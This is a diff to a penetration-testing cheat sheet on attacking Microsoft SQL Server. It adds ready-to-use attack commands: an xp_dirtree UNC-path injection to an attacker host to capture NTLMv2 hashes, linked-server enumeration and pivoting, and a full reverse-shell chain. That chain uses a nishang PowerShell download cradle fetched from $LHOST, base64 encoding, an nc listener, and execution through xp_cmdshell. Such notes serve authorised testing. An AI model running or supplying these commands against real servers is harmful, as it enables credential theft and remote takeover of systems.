@@ -65,8 +65,11 @@ Invoke-SQLOSCmd -Verbose -Instance SQL01.corp.local -Command 'whoami'
 
 ```sql
 -- UNC path injection (capture NTLMv2 hash via Responder)
-EXEC xp_dirtree '\\$LHOST\share';
 -- Run Responder first: sudo responder -I eth0
+EXEC xp_dirtree '\\$LHOST\share';
+[or]
+xp_dirtree '\\$LHOST\share';
+
 ```
 
 ## 9.3 MSSQL Linked Server Exploitation
@@ -75,6 +78,32 @@ EXEC xp_dirtree '\\$LHOST\share';
 -- Enumerate linked servers
 SELECT * FROM sys.servers WHERE is_linked = 1;
 EXEC sp_linkedservers;
+
+enum_db
+enum_links
+use_link "LinkedServer"
+```
+
+```bash
+# Getting Shell - Terminal 1
+# Copy PowerShellTcpOneLine.ps1 and Edit
+cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 shell.ps1
+
+# Create reverse shell file - cmd
+IEX(New-Object Net.WebClient).downloadString('http://$LHOST:PORT/shell.ps1')
+
+# Convert it to base64 encode 
+cat cmd | iconv -t UTF-16LE | base64 -w0 
+# Output AAABBBCCC....CDEFHIAA==
+
+# Run python server 
+python3 -m http.server 
+
+# Listener - Terminal 
+rlwrap nc -lvnp PORT
+
+# Execute command from SQL server 
+> xp_cmdshell powershell -enc AAABBBCCC....CDEFHIAA== 
 ```
 
 ```powershell
